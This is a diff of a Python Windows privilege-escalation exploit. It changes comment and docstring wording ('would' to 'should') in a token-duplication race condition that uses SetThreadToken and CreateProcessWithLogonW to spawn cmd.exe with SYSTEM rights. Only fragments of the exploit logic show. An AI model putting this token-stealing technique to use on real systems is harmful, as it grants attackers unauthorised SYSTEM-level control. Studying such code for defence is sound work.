@@ -24,7 +24,7 @@ DuplicateToken()
         |'->[IMPORTANT!!] 
         |   |
         |  '-> Our current process [python.exe] start to re-use OR create new threads, it means that  
-        |      threads which have SYSTEM Tokens, would spawn new process with respectives permissions.
+        |      threads which have SYSTEM Tokens, should spawn new process with respectives permissions.
         |      (that's what i understood about it, but maybe it could be a wrong mindset)
         v
     SetThreadToken()
@@ -201,9 +201,9 @@ if __name__ == "__main__":
 
         print("[*] Starting Token/Process RACE CONDITION!!")        
         def Thread_Race(loop):
-            """This race condition means that our python.exe process would create a new process, 
+            """This race condition means that our python.exe process should create a new process, 
             using our previously duped token, therefore spawning cmd.exe using CreateProcessWithLogonW function.
-            if we get some luck, this process would be called as an child process from a [NT/SYSTEM python.exe] thread.
+            if we get some luck, this process should be called as an child process from a [NT/SYSTEM python.exe] thread.
             """ 
             for i in range(0, loop):
                 advapi32.SetThreadToken(addressof(hThread), hDuplicateTokenHandle)
